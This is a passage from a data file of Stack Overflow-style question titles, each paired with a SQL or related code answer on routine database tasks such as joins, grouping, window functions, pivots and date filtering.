                  case when row_number() over (partition by maingroup, subgroup order by subgroupbudget desc) = 1 then subgroupbudget
                  end subgroupbudget
           from t)
select maingroup,
       subgroup,
       random,
       sum(subgroupbudget) over (partition by maingroup) groupbudget
from   t1;

MAINGROUP SUBGROUP RANDOM  GROUPBUDGET
--------- -------- ------- -----------
Group1    Name 1   random         1000
Group1    Name 1   random2        1000
Group1    Name 2   random3        1000
Group2    Name 3   random4        1500
Group2    Name 4   random5        1500
Group2    Name 5   random6        1500
"
35335,11064,How to return a specific row to the Bottom from a SQL Query results?,"select 
    [BusinessModel], count(*) As Total 
from DimHotelExpand
group by 
    [BusinessModel] 
order by 
    case [BusinessModel] when 'Lead' then 1 else 0 end asc
"
28525,56685,How to select a limited amount of rows for each foreign key?,"SELECT x.feedid
  FROM (SELECT t.feedid,
               CASE WHEN @feed != t.feedid THEN @rownum := 1 ELSE @rownum := @rownum + 1 END AS rank,
               @feed := t.feedid
          FROM TABLE t
          JOIN (SELECT @rownum := NULL, @feed := 0) r
      ORDER BY t.feedid) x
 WHERE x.rank <= 3
 ORDER BY x.feedid
 LIMIT 50
"
33072,32441,oracle conditional where clause with filter,"WHERE
(
  b.kurum_turu = 1
  AND u.kod  in ('1125', '2975', '1127', '4460', '1128', '1126')
)
OR
(
  u.kod  in ('1125', '2975') 
)
"
16463,4432,Group rows into sets of 5,";WITH CTE AS
(
    SELECT col1,
           RN = ROW_NUMBER() OVER(ORDER BY col1)
    FROM TableA
)
SELECT col1, (RN-1)/5+1 col2
FROM CTE;
"
51,2012,"Difference between SYSDATE(),NOW(),CURRENT_TIMESTAMP,CURRENT_TIMESTAMP() in MySQL?","SELECT NOW(), SYSDATE(), SLEEP(5), NOW(), SYSDATE()
"
24217,65274,Get Weeks in SQL,"SELECT DATEPART(wk, DateField) AS WeekNumber, COUNT(*) AS HitsForWeek
FROM SomeTable
WHERE DateField >= '20090101' AND DateField < '20100101'
GROUP BY DATEPART(wk, DateField)
"
25667,31805,Using wildcards in Sql to match patterns,"WITH DATA AS(
    SELECT 'XKA' str FROM dual UNION ALL
    SELECT 'XKB' FROM dual UNION ALL
    SELECT 'XSA' FROM dual UNION ALL
    SELECT 'XSB' FROM dual UNION ALL
    SELECT 'XAA' FROM dual
    )
    SELECT str
    FROM DATA
    WHERE regexp_like (str, 'X[^KS]');



X -> first character
^[KS] -> second character not in K or S
"
16499,36882,Left join without using left join with 3 tables,"SELECT t.* FROM
(
    SELECT O.ORDER_ID, O.ORDER_DATE, C.CUST_CODE, C.CUST_NAME, P.PART_CODE, P.PART_NAME 
    FROM ORDERS O
    INNER JOIN PART P
        ON P.PART_ID = O.PART_ID
    INNER JOIN CUSTOMER C
        ON C.CUST_ID = O.CUST_ID
    UNION
    SELECT O.ORDER_ID, O.ORDER_DATE, NULL AS CUST_CODE, NULL AS CUST_NAME, P.PART_CODE,
        P.PART_NAME 
    FROM ORDERS O
    INNER JOIN PART P
        ON P.PART_ID = O.PART_ID
    WHERE O.CUST_ID NOT IN (SELECT C.CUST_ID FROM CUSTOMER C)
        OR O.CUST_ID IS NULL
    UNION
    SELECT O.ORDER_ID, O.ORDER_DATE, C.CUST_CODE, C.CUST_NAME, NULL AS PART_CODE,
        NULL AS PART_NAME 
    FROM ORDERS O
    INNER JOIN CUSTOMER C
        ON C.CUST_ID = O.CUST_ID
    WHERE O.PART_ID NOT IN (SELECT P.PART_ID FROM PART P)
        OR O.PART_ID IS NULL
    UNION
    SELECT O.ORDER_ID, O.ORDER_DATE, NULL AS CUST_CODE, NULL AS CUST_NAME,
        NULL AS PART_CODE, NULL AS PART_NAME
    FROM ORDERS O
    WHERE (O.CUST_ID NOT IN (SELECT C.CUST_ID FROM CUSTOMER C) AND
           O.PART_ID NOT IN (SELECT P.PART_ID FROM PART P)) OR
           (O.CUST_ID IS NULL AND O.PART_ID IS NULL)
) t
ORDER BY t.ORDER_ID ASC
"
10828,72144,How to filter a timestamp format using Mysql?,"SELECT * FROM user
WHERE acct_created BETWEEN UNIX_TIMESTAMP('datefrom') AND UNIX_TIMESTAMP('dateto') 
"
31446,43722,How to convert date to text Month?,"SELECT DATENAME(mm, DateCol) AS [Month]
FROM MyTable
"
18575,24561,Access join of two subqueries,"SELECT Items.ID, Items.Description, (Items.TotalCount + A.Quantity - B.Quantity) as OnHandQty 
FROM Items INNER JOIN 
(SELECT Items.ID, Count(Trans_Add.s) AS Quantity
FROM Items INNER JOIN Trans_Add ON Items.ID = Trans_Add.s
GROUP BY Items.description
) A
ON Items.ID = A.ID
INNER JOIN (
SELECT Items.description, Count(Trans_Remove.s) AS Quantity
FROM Items INNER JOIN Trans_Remove ON Items.ID = Trans_Remove.s
GROUP BY Items.description
) B
ON Items.ID = B.ID
"
4784,35038,How to realm database retrieve a nameKey-value in react-native?," let result = realm.objects('AppSetting').filtered('name = ""gpsEnabled""');
 let val = result[0].value;
"
10445,23153,sql - salesmen by territory query - combine multiple statements with WITH clause,"SELECT DISTINCT terr, salm, salesmen
FROM File -- I really hope that's not your file name - it's a reserved word
JOIN (SELECT terr territory, COUNT(DISTINCT salm) salesmen
      FROM File
      GROUP BY terr) Salesmen_Per_Territory
ON territory = terr
"
38626,30601,How to run sub-queries from an INSERT statement?,"INSERT  INTO tLiveTable
        (PieceID, TimeStamp, LocationRef)
SELECT  ID 
,       getdate()
,       (
        SELECT  ID 
        FROM    tLocationRefs 
        WHERE   Equipment = 'CHARGE_TABLE'
        )
FROM    tPieceTable  
WHERE   tPieceTable.BatchNo = @BatchNo
        AND tPieceTable.PieceNo = @PieceNo
"
16420,54658,for f/ tokens in sql,"  SUBSTRING(pkey, 1, CHARINDEX('-', pkey, 1) - 1)
"
8503,20360,stuck with one query in SQL Server,"select sum(price) from calci  group by (rn- freq)
"
28774,42432,getting the minimum and maximum date in the same query,"SELECT a.client_id AS client_id
   , a.patientcount AS patientcount
   , max(f.received_date) AS maxRecDate
   , min(f.received_date) AS minRecDate
FROM
(
   SELECT DISTINCT CLIENT_ID
   , PATIENT_ID
   , count(*) over (partition by client_id, patient_id) AS patientcount
   from f_accession_daily
) AS a
JOIN F_ACCESSION_DAILY AS f ON a.CLIENT_ID = f.CLIENT_ID
   AND a.PATIENT_ID = f.PATIENT_ID
GROUP BY a.CLIENT_ID, a.patientcount
"
35016,40124,adding two subqueries to produce third column,"SELECT t.*,t.district1 + t.district2  `new_col`
FROM (
SELECT d.id, CONCAT(d.disease, '( ' ,d.disease_nepali, ' ) ') AS DISEASE, 
IFNULL((SELECT patients.D_O_M+patients.D_O_F FROM patients WHERE clinic = 22 AND     patients.disease = p.disease),0) AS `district1` , 
IFNULL((SELECT patients.D_O_M+patients.D_O_F FROM patients WHERE clinic = 21 AND disease = p.disease),0) AS `district2`
 FROM diseases d
LEFT JOIN patients p ON 
(d.id = p.disease AND p.district = 9 AND p.status = 1 AND p.report_date LIKE '2014-03%') 
GROUP BY disease
) t
"
38658,40826,How to limit mysql query and also limit it by a timestamp?,"SELECT id, title, timestamp, upvotes, downvotes, views 
FROM {$table} 
WHERE timestamp >= DATE_SUB(CURRENT_DATE, INTERVAL 1 MONTH) 
ORDER BY count 
DESC LIMIT $start_from, 20
"
38175,20920,Execute Immediate with Non-Sql type,"CREATE OR REPLACE TYPE t_error_msgs AS TABLE OF VARCHAR2(2000)
/

CREATE OR REPLACE PACKAGE p42 AS
  FUNCTION handler RETURN t_error_msgs;
END p42;
/

CREATE OR REPLACE PACKAGE BODY p42 AS
  FUNCTION handler RETURN t_error_msgs IS
  BEGIN
    RETURN null; -- put real data here, obviously...
  END handler;
END p42;
/

DECLARE
  v_error_msg t_error_msgs;
  v_function varchar2(30);
BEGIN
  v_function := 'p42.handler';
  EXECUTE IMMEDIATE 'BEGIN :result := ' || v_function || '; END;'
    USING OUT v_error_msg;
END;
/
"
15828,55569,Error in hive query,"#!/bin/sh
echo ""Executing the hive query - starts""
hive -e ""load data inpath '/user/cloudera/Divisas/Barril_Brent.csv' into overwrite into table BarrilBrent""
echo ""Executing the hive query - ends""
"
6156,60379,Select and aggregate last records base on order,"WITH recordsList
AS
(
    SELECT Type, Charges,
            ROW_NUMBER() OVER (PArtition BY TYPE
                                ORDER BY [ORDER] DESC) rn
    FROM tableName
)
SELECT  SUM(Charges) totalCharge
FROM recordsLIst
WHERE rn = 1
"
33275,63077,SQL Grouping / Contract Value,"select agentid, accountid
from table t
inner join (
  select agentid, parentaccount
  from table
  group by agentid, parentaccount
  having sum(tcv) >= 10000
) t1
  on t.agentid = t1.agentid
     and t.parentaccount = t1.parentaccount
"
33301,14479,Conditional aggregate with Group By clause," SELECT concat(id1,'-', id2) `key`, count(*) , 
 sum( case when category = 1 then 1 else 0 end) category1count , 
 sum( case when category = 2 then 1 else 0 end) category2count
 FROM table1 
 GROUP BY concat(id1,'-', id2)
"
23814,36288,Displaying BLOBs dynamically,"//page 120 only holds the 2 images for a contact. Due to images being in
//blobs and no easy way to dynamically fetch them, i made a small
//form with the 2 photos on, and id + contact_id
//(contact_id made PK for the ARF-process, since this is what is worked with)
//The page is pulled in, and the photos retrieved

//htmldb_get does not do the job! It only pulls the page from cache, which isnt what i want

// arrays with the arguments and their values for the post
var vArgs = new Array();
var vVals = new Array();

vArgs.push(""P120_CONTACT_ID"");
vVals.push(cid);

$.post('wwv_flow.show', 
       {""p_request""      : ""NULL"",
        ""p_flow_id""      : $v('pFlowId'),
        ""p_flow_step_id"" : ""120"",
        ""p_instance""     : $v('pInstance'),
        ""p_arg_names""    : vArgs,
        ""p_arg_values""   : vVals}, 
       function(data){
         var oContainerSmall = $(""#id_photo_container"").empty(),
             oSmallPhoto = $(data).find(""#P120_SMALL_PHOTO"").attr({""id"":""id_photo"",
                                                                   ""alt"":oContact.lastname + "" "" + oContact.firstname}),
             oLargePhoto = $(data).find(""#P120_LARGE_PHOTO"").attr(""alt"",oContact.lastname + "" "" + oContact.firstname);

         $(""#large_photo_container"").empty().append(oLargePhoto);
         $(""#large_photo_container"").css({""display"": ""block"", ""visibility"": ""hidden""});

         //Why remove and remake the container? 
         //for some reason i couldn't find out, the image width and height get reset to 0 after 
         // an initial display of the enlarged picture and closing its dialogbox.
         //I assume it is an apex+css+javascript issue.
         //The only fix i was able to find was to remove the div and remake a new one.
         // There have to be some properties set on the div and/or its children through
         // the closing of the popup dialog (for the larger picture), 
         // which then prevents subsequent calls to get the correct values.
         $(""#large_photo_container"").remove();
         var oContainerLarge = $(""<div></div>"").attr(""id"",""large_photo_container"").css({""display"":""block"", ""visibility"":""hidden""});
         oContainerLarge.append(oLargePhoto);
         $(""body"").append(oContainerLarge);

         //Hardcoded value here! Adapt when necessary
         if($(""#id_contact_type"").val() == ""Conference Room""){
            var oLink = $(""<a/>"").attr(""href"", ""#"")
                                .click(function(event){
                                         explode_headshot(event, this);
                                       });
            oContainerSmall.append(oLink.append(oSmallPhoto));
         } else {
            oContainerSmall.append(oSmallPhoto);
         };

         $(""#contact_popup"").dialog({modal: true,
                                     width: 750,
                                     resizable: false, 
                                     title: oContact.lastname + "" "" + oContact.firstname,
                                     close: function(event, ui){
                                       $(""#id_photo"").attr({""src"": """", ""alt"": """"});
                                    }});
      });
"
39245,62158,How Do I Convert a Y2K Date to SQL DATE In SSIS?,"1. ((DT_WSTR,8)(<<AS400>> + 19000000)) 
2. (DT_DBDATE)(SUBSTRING(DCDateString,1,4) + ""-"" + SUBSTRING(DCDateString,5,2) + ""-"" + SUBSTRING(DCDateString,7,2))
"
5754,55729,MS Access query table without primary key,"SELECT *
FROM Table1
WHERE Claim IN (SELECT Claim
                FROM Table1
                WHERE Total > 500)
"
9354,61958,Copying specific data from one MySQL table to another,"INSERT INTO new (ip)
SELECT old.ip 
FROM old
INNER JOIN new on old.email = new.email;
"
6365,42401,mysql row numbering reset every different record values,"SELECT  A.ID, 
        A.plate_number, 
        (
            SELECT  COUNT(*)
            FROM    tableName c
            WHERE   c.plate_number = a.plate_number AND
                    c.ID <= a.ID) AS RowNumber
FROM    TableName a
"
13016,64616,SQL Nested Case When with numeric check,"select (case when len(code) in (8, 10, 13) and code not like '%[^0-9]%'
             then code
             else '*' + code
        end)
"
24286,26231,How to deal with one or more races,"create table #test (name varchar(50), gender varchar(3), dateofbirth datetime, race varchar(50))

Insert into #test 
Values ('Susie Smith', 'f', '10/10/1940', 'white'),('Susie Smith', 'f', '10/10/1940', 'asian')


select *
from #test
PIVOT (max(race) for race in ([white],[asian])) as pv
"
12827,3799,Laravel Eloquent to join table and count related,"$this->model->leftJoin('Rooms', 'Properties.ID', '=', 'Rooms.Property')
  ->selectRaw('Properties.*, count(Rooms.RoomID) as RoomsCount')
  ->groupBy('Properties.ID')
  ->get();
"
7157,3244,SQL Server - view all foreign key dependencies,"select OBJECT_NAME(parent_object_id), OBJECT_NAME(referenced_object_id)
    from sys.foreign_keys
    where referenced_object_id = object_id('SchemaName.TableName')
"
4187,4516,Join two tables and group by xyz,"SELECT DISTINCT ref, status
FROM
(
    SELECT ref, status
    FROM Table1
    UNION ALL
    SELECT ref, status
    FROM Table2
) x
"
5905,18160,Need to pull only last date in table that stores change dates SQL / ODBC,"select somefields
from sometables
join
(select something, max(datetimefield) maxdt
from table1
where whatever
group by something ) temp on table1.datetimefield = maxdt
etc
"
38906,63849,SQL Find latest date where condition doesn't exist,"select c.*, con.*
from client c cross apply
     (select top 1 con.*
      from (select con.*,
                   sum(case when Outcome = 2 then 1 else 0 end) over (partition by ClientId, AppDate) as num2s
            from contact con
            where con.ClientId = c.ClientId and
                  con.AppDate < '2015-11-08'
           ) con
      where num2s = 0
      order by AppDate desc
     ) con;
"
2055,47752,"selecting max date in range, excluding multiple other date ranges","SELECT TOP 1 tDate.SeqDate
FROM dbo.fnSeqDates('6/1/2012', '6/30/2012') tDate
    LEFT JOIN bfShow tShow
        ON tDate.SeqDate BETWEEN tShow.DateStart AND tShow.DateEnd
WHERE tShow.ShowID IS NULL -- no matches found
ORDER BY tDate.SeqDate DESC -- to pull the most recent date
"
2926,71961,Convert rows to columns with some conditions in sql,"SELECT GROUP_CONCAT(`name` SEPARATOR ' ') AS `name`
FROM tbl
GROUP BY `value`
"
2233,23756,Call SP from another SP with result set,"CREATE TABLE #Temp (StudentId int null, <Other columns as required>)

INSERT #Temp
 EXECUTE ChildSP
"
28795,19222,Get the name of resource from table depending on the id,"select  EXTRACT(DAY from timestamp), resource.name, count(transactions.id) 
from transactions inner join resource 
    on transactions.resourceid = resource.id
where timestamp between '01-OCT-13' AND '10-OCT-13'
group by resource.name, EXTRACT(DAY from timestamp)
order by EXTRACT(DAY from timestamp);
"
16465,73147,Can you SELECT WHERE something's LIKE and IN at the same time?,"select
  *
from
  Table1 t1
    inner join Table2 t2 on (t1.name like t2.name + '%')
"
8539,5243,Many-to-many relationship between tables - how to model in SQL,"Unit     UnitUpgrade     
Id   --- UnitId          Upgrade
Name     UpgradeId   --- Id
                         Name
                         Description
"
39686,56985,SQL Server query to calculate balance,"Declare @RunningTotals Table    
    (
    PrimaryKeyCol int not null Primary Key
    , TableName nvarchar(128) not null
    , Total money not null Default ( 0 )
    )

Declare @Values Cursor
Declare @PrimaryKeyCol int  
Declare @TableName nvarchar(128)
Declare @Date datetime
Declare @In money
Declare @Out money
Set @Values = Cursor Fast_Forward For
        Select Key1, 'Table1' As TableName, Date , In , Null as out
        From table1
        Union All
        Select Key2, 'Table2', Date, Null as In, Out
        From Table2     
        Order By Date

Open @Values
Fetch Next From @Values Into @PrimaryKeyCol, @TableName, @In, @Out

Set @Total = 0
While @@Fetch_Status = 0
Begin
    Set @Total = @Total + Coalesce(@In,0) - Coalesce(@Out,0)

    Insert @RunningTotals( PrimaryKeyCol, TableName, Total ) 
    Values( @PrimaryKeyCol, @TableName, @Total )

    Fetch Next From @Values Into @PrimaryKeyCol, @TableName, @In, @Out
End

Close @Values
Deallocate @Values

Select Date, In, Out, RT.Total
From (
        Select Key1 As PrimaryKeyCol, 'Table1' As TableName, Date , In , Null as out
        From table1
        Union All
        Select Key2, 'Table2', Date, Null as In, Out
        From Table2     
        ) As Z
    Join @RunningTotals As RT
        On RT.PrimaryKeyCol = T.PrimaryKeyCol
            And RT.TableName = Z.TableName
"
17355,23560,Multiple table query - SQL,"select products.category, products.description, products.brand, stores.brands, stores.location, products_stores.price
from products_stores
inner join stores on stores.id = products_stores.stores_id
inner join products on products.id = products_stores.products_id
"
17422,38553,Isolation level for two statements on the same transaction vs. single statement,"INSERT INTO event(kind, num)
SELECT 'A', COALESCE(MAX(num) + 1, 0) FROM event WHERE kind='A';
"
8411,13155,Select rows in a self-relationship where all children meet a condition,"SELECT DISTINCT `documents`.*
FROM (`documents`)
LEFT OUTER JOIN `documents` children_documents
  ON `documents`.`id` = `children_documents`.`parent_id`
  AND `children_documents`.`status` = 'accepted'
WHERE `children_documents`.`parent_id` IS NULL
"
8648,33318,2 time periods in one report SQL Reportbuilder 2012 3.0," SELECT 
    tblReg.PurchaseOrderId,
    tblReg.Reference AS PO, 
    SUM(HoursBefore) AS HoursBefore, 
    SUM(HoursBefore)/8 AS DaysBefore, 
    SUM(HoursBetween) AS HoursBetween, 
    SUM(HoursBetween)/8 AS DaysBetween, 
    SUM(HoursAfter) AS HoursAfter, 
    SUM(HoursAfter)/8 AS DaysAfter, 
    MIN(BudgetDays) AS BudgetDays
FROM
(
    SELECT 
        po.PurchaseOrderId,
        po.Reference,
        BudgetDays,
        CASE 
            WHEN reg.RegistrationDate < @StartDate THEN DurationHours
            ELSE 0
        END AS HoursBefore,
        CASE 
            WHEN reg.RegistrationDate >= @StartDate AND reg.RegistrationDate <= @EndDate THEN DurationHours
            ELSE 0
        END AS HoursBetween,
        CASE 
            WHEN reg.RegistrationDate > @EndDate THEN DurationHours
            ELSE 0
        END AS HoursAfter
    FROM Registration reg
    INNER JOIN PurchaseOrder po ON reg.PurchaseOrderId = po.PurchaseOrderId
    WHERE po.statuscid = 1 AND reg.IsBillable = 1 AND SetNonBillable = 0 --AND reg.RegistrationDate >= @StartDate AND reg.RegistrationDate <= @EndDate
)tblReg
GROUP BY tblReg.PurchaseOrderId, tblReg.Reference
ORDER BY tblReg.Reference;
"
8614,35013,Run MySql query on all ids in another table,"select a.PmsId, a.FirstName, a.LastName, b.LastTransactionDate
from (select PmsId, FirstName, LastName
    from Clients
    group by PmsId) a
left join (select a.ClientPmsId, max(b.LastTransactionDate) LastTransactionDate
    from ClientPatientRelationships a
    join Patients b on a.PatientPmsId = b.PmsId
    group by a.ClientPmsId) b on a.PmsId = b.ClientPmsId;
"
16686,19815,Access SQL Randomizer Not working as intended,"SELECT Questions.QuestionID 
FROM Questions 
WHERE Questions.QuestionDifficulty=[?] 
  AND ( Questions.LastDateRevealed Is Null 
     OR Questions.LastDateRevealed < DateAdd('d',-2,Date()) ) 
  ORDER BY Rnd(Questions.QuestionID * Time());
"
421,43375,SQL Joining Information From 3 Tables,"SELECT [Log].[Column1], [Request].[Column2], [Request].[Column3] , IsNull([SMP_Request].[Action], '') as Action
    FROM [Log]
         INNER JOIN [Request] ON [Log].[RequestID] = [Request].[ID]
         LEFT JOIN [SMP_Request] ON [SMP_Request].[RequestID] = [Request].[ID]
"
21162,51705,ORA-01779: cannot modify a column which maps to a non key-preserved table on updating joined tables,"MERGE INTO uas_mapping_test t1
USING 
(   
  select pt.poid_id0, umt.plan_id
    from norie.plan_t_test pt 
    join norie.UAS_MAPPING_TEST umt on (pt.poid_id0 = umt.plan_id)
) ta ON poid_id0 <> plan_id
WHEN MATCHED THEN UPDATE 
set plan_id = poid_id0
"
390,74130,Retrieve records between particular date range,"Declare @starttime datetime = '6-24-15 08:00:00'
Declare @endtime datetime = '6-24-15 09:00:00'

Select * from MyTable
where StartTime <= @endtime and endtime >= @starttime
"
33515,37259,Retrieve data from changed rows records,"   ;WITH cte ([emptying time], [Initial Volume], Volume) AS 
        (SELECT      (SELECT TOP 1 H2O_1.[timestamp]
         FROM        [H2O] H2O_1
         WHERE       H2O_1.[H2O_TOOLS_P2_JY_TREND_VAL0] = 2 
         AND         H2O_1.[timestamp] < H2O_2.[timestamp]) AS [emptying time],
        (SELECT TOP 1 H2O_1.H2O_LT301_VOL_VAL0
         FROM       [H2O] H2O_1
         WHERE      H2O_1.[H2O_TOOLS_P2_JY_TREND_VAL0] = 2 
         AND        H2O_1.[timestamp] < H2O_2.[timestamp]) AS [Initial Volume],
         H2O_2.H2O_LT301_VOL_VAL0 As Volume         

         FROM        [H2O] H2O_2
         WHERE       H2O_2.H2O_TOOLS_P2_JY_TREND_VAL0 = 3
        )
   Select  Distinct c.[emptying time],
             max(c.[Initial Volume]) as [Initial Volume],                
             min(c.Volume) as [Final Volume],
             (max(c.[Initial Volume]) - min(c.Volume)) as [Emptying volume]
   from cte c
   group by  c.[emptying time]
"
19034,31729,SQL SELECT --> csv file,"SELECT 'LastName', 'FirstName', 'Username', 'IsActive', 'Graduation'
UNION ALL
SELECT a.last_name, a.first_name, username, is_active, graduation
INTO OUTFILE 'yourFile.csv'
FIELDS TERMINATED BY ',' OPTIONALLY ENCLOSED BY '""'
FROM auth_user a
INNER JOIN  userprofile_userprofile u
ON a.id = u.user_id
WHERE a.id>39 AND a.is_active=1
ORDER BY last_name
"
30072,45632,Select data which have same letters,"SELECT s.str, CAST(count(s.str) AS decimal) / t.cnt * 100 AS pct
  FROM (SELECT substr(entry, 7) AS str FROM data) AS s
  JOIN (SELECT count(*) AS cnt FROM data) AS t ON 1=1
 GROUP BY s.str, t.cnt;
"
31603,72075,Changeable variable of all rows in a column,"DECLARE @name VARCHAR(20) -- database name 

DECLARE db_cursor CURSOR FOR  
SELECT subdirectory 
FROM #DirectoryTree 

OPEN db_cursor   
FETCH NEXT FROM db_cursor INTO @subdirectory    

WHILE @@FETCH_STATUS = 0   
BEGIN   
    INSERT INTO [test5].[dbo].[tblJob]
    SELECT *  FROM OPENDATASOURCE(
    'Microsoft.Jet.OLEDB.4.0',
    'Data Source=""\\bhr05\mdb\' + @subdirectory + '.mdb""' 

END   

CLOSE db_cursor   
DEALLOCATE db_cursor
"
2616,3861,SQL Email Job Failing after amending it,"EXEC msdb.dbo.sp_send_dbmail
    @profile_name = 'test=email',
    @recipients = 'test@hotmail.co.uk',
    @subject = 'Users Report',
@body = '<b> Please follow the correct procedure (see other email)',
@body_format = 'HTML',    
    @query = 'SELECT   [testDB].[dbo].[base_user].buser_userid  AS [N4 User ID]
            , [testDB].[dbo].[base_user].buser_firstName + '' '' +
           [testDB].[dbo].[base_user].buser_lastName as [Users Name]
            ,[testDB].[dbo].[sec_role].role_name  as [Role]
            ,[testDB].[dbo].[sec_role].role_description as [Description]
            ,[testDB].[dbo].[base_user].buser_active AS [Active?]
FROM      [testDB].[dbo].base_user
INNER JOIN [testDB].[dbo].[sec_user_role_map] ON testDB.dbo.base_user.[buser_gkey] = testDB.dbo.[sec_user_role_map].[usrrolm_user_gkey]
INNER JOIN [testDB].[dbo].[sec_role] ON testDB.dbo.[sec_user_role_map].[usrrolm_role_gkey] = testDB.[dbo].[sec_role].role_gkey

',
    @attach_query_result_as_file = 1;
"
15621,9208,Design dababase where every user has a list of favorites,"user_id
comment_id
"
3403,6392,Is it possible to select and insert its result in MySQL?,"insert into table1
(Column1, Column2)
select Column1, Column2
from table2
"
4929,19030,Postgresql Function Volatility Categories,"with q1 as (
    select isallowed(1) res
    ),
q2 as (
    delete from permisions
    where id = 1
    returning id
    )
select 
    id, res, isallowed(1)
from q1
cross join q2;

 id | res | isallowed 
----+-----+-----------
  1 | t   | f
(1 row) 
"
18727,67153,Create relationship table for one-row relationships?,"create table roles 
(
  id integer primary key,
  role_name varchar(50) not null
);

create table users
(
   id integer not null primary key,
   username varchar(50) not null,
   role_id integer not null,
   ... other columns ...
);
alter table users 
   add constraint fk_users_rol 
   foreign key (role_id) references roles(id);
"
5696,30934,How to access a field inside a rowtype in a Postgresql query?,"select A,B, (func(A,B)).X from FOO;
"
31231,9780,Postgres update with an inner join across 2 tables?,"UPDATE
    animal_attribute_values aav
SET
    animal_attribute_value_name = 'Some new value'
FROM animals aa
WHERE aa.animal_id = 458
AND aa.animal_attrib_value_id = aav.animal_attrib_value_id
  ;
"
12038,4543,Identifying parent records for many transactions,"select rowid, dateid, billtoid, activitytypeid, serialnumber
from (select t.*,
             max(case when activitytypeid = 'Ship' then billtoid end) over
                  (partition by serialnumber, cumships) as ship_billtoid
      from (select t.*,
                   sum(case when activitytypeid = 'Ship' then 1 else 0 end) over
                       (partition by serialnumber order by rowid) as cumships
            from t
           ) t
     ) t
where billtoid <> ship_billtoid;
"
17938,2185,sql query return values for rows n times,"SELECT suborgs.* 
FROM wp_postmeta suborgs JOIN
     (SELECT '152' as post_id UNION ALL SELECT '162' UNION ALL SELECT '156' UNION ALL
      SELECT '154' UNION ALL SELECT '152' UNION ALL SELECT '162'
     ) p
     ON suborgs.meta_key = 'product_relationship' AND
        suborgs.post_id = p.post_id;
"
13761,69977,SQL Constraints Question,"Create table mytable(id1 int, id2 int)
go

create Function dbo.fx_Transposed(@id1 int, @id2 int)
returns bit as 
Begin
    Declare @Ret bit
    Set @ret = 0
    if exists(Select 1 from MyTable 
    	Where id2 = @id1 and id1 = @id2)
    Set @ret = 1
    Return @ret
End
GO
Alter table mytable add
CONSTRAINT [CHK_TRANSPOSE] CHECK 
 (([dbo].[fx_Transposed]([ID1],[ID2])=(0)))
GO
Insert into mytable (id1, id2) values (1,2)

Insert into mytable (id1, id2) values (2,1)
"
22831,20550,How to Count total Medal of Sports,"SELECT      STATE,
            SUM(Point) AS MEDAL,
            SUM(CASE WHEN Point = 7 THEN 1 ELSE 0 END) AS GoldCount,
            SUM(CASE WHEN Point = 5 THEN 1 ELSE 0 END) AS SilverCount,
            SUM(CASE WHEN Point = 4 THEN 1 ELSE 0 END) AS BronzeCount

FROM        [Sheet2$]

GROUP BY    STATE 

ORDER BY    SUM(Point) DESC
"
4697,42951,Nesting sql queries inside case,"Select 
  X.Col1,
  X.Col2,
  Y.Col1,
  Y.Col2,
  COALESCE(t4.Col1 ,t5.Col4)
  END
FROM Table X INNER JOIN Table Y ON X.ID = Y.XID
LEFT OUTER JOIN TableFour t4 ON t4.id = Y.FileID AND Y.TableID = 4
LEFT OUTER JOIN TableFive t5 ON t5.id = Y.FileID AND Y.TableID = 5
"
10894,60702,Query result organization,"SELECT Item_ID, SUM(Quantity), Sum(Sale)
FROM Item
JOIN Purchase ON Item.Item_ID=Purchase.Item_ID
JOIN Transaction ON Purchase.Transaction_ID=Transaction.Transaction_ID
WHERE Client_ID = $ClientId
AND Transaction.Timestamp>= $start
AND Transaction.Timestamp <= $end
GROUP BY Item_ID
ORDER BY SUM(Quantity), SUM(Sale) DESC
"
22356,40164,MS Access fields as columns,"TRANSFORM Sum(tabl1.[Quantity]) AS SumOfQuantity
SELECT tabl1.[brand], Sum( tabl1.[Quantity]) AS [Total Of Quantity]
FROM tabl1
GROUP BY tabl1.[brand]
PIVOT tabl1.[Date];
"
22376,55787,Display contents of TSQL view,"exec sp_helptext yourViewName
"
15212,32826,Check Authentication Mode of SQL Server,"Exec xp_instance_regread N'HKEY_LOCAL_MACHINE', N'Software\Microsoft\MSSQLServer\MSSQLServer', N'LoginMode'
"
27310,48412,MySQL Update in Multiple Tables... trigger? cascade?,"ALTER TABLE 
MODIFY active FOREIGN KEY fk_name (active) REFERENCES OPTION(active) ON UPDATE CASCADE
"
24513,54204,Two query Sql Expression,"CASE WHEN ""Items"".""ItemId"" IS NULL THEN NULL
ELSE

    SELECT TOP 1 Price 
    FROM [MYDB].[dbo].[PriceTables] p
    WHERE p.UnitsSoldBreak >= ( SELECT SUM([QuantitySold]) 
                FROM Skus 
                WHERE Skus.ItemId = ""Items"".""ItemId"" 
                  AND Skus.SkuEnabled = 1)
      AND p.ItemId = ""Items"".""ItemId""
    ORDER BY p.UnitsSoldBreak asc

END
"
11415,7288,Are triggers executed with the current transaction isolation level?,"alter table your_table
    add constraint yr_tab_uk unique (category, code)
    using index
/
"
14465,967,Not able to perform Query Grouping,"SELECT B.CourseProgram,C.CourseLevelName,
sum(case when E.InstituteStatusName =' Status1' then 1 else 0 end) as     Status1,
sum(case when E.InstituteStatusName =' Status2' then 1 else 0 end) as  Status2,
FROM Master_ChoiceCode A 
inner join Master_MainCourse B on A.MainCourseID=B.MainCourseID
inner join Master_CourseLevel C on A.CourseLevelID=C.CourseLevelID  
inner join  Master_Institute D on A.InstituteID=D.InstituteID
inner join Master_InstituteStatus1 E on D.InstituteStatusID1=E.InstituteStatusID
where B.CourseLevelID IN(1,2)
GROUP BY B.CourseProgram,A.CourseLevelID,C.CourseLevelName
order by B.CourseProgram,C.CourseLevelName;
"
10229,48155,case when grouping in sql,"SELECT
  COUNT(id), AgeRange
FROM
  (
  select
    id,
    case
    when age < 0 then 'less than 0'
    when age >= 0 and age <=30 then '0-30'
    when age >= 31 and age <=60 then '31-60'
    when age >= 61 and age <=90 then '61-90'
    when age >= 91 then '91+'
    when age = null then 'NO INFORMATION'
    else 'no catagory'
    end AS AgeRange
  from queue 
  where DATE between '01-Apr-2011' and '05-May-2011'
  ) T
GROUP BY
  AgeRange;
"
3697,39621,How to escape single quotes in Oracle?,"select * from table where reason = '''missed transaction''';
"
31900,44879,SQL Count within a Select,"select p.photoID,
p.photoName,
m.memberID,
m.memberFName,
count(r.RatingID) as RatingCount
from Photo p
inner join Member m on p.memberID = m.memberID
left outer join Rating r on p.photoID = r.photoID
group by p.photoID, p.photoName, m.memberID, m.memberFName
"
18752,30247,Find out the Duplicate Records in Sql-server,"SELECT *
FROM (
    SELECT *, RowNum = ROW_NUMBER() OVER (PARTITION BY STAFFID, officeid ORDER BY STAFFID)
    FROM dbo.stafftable
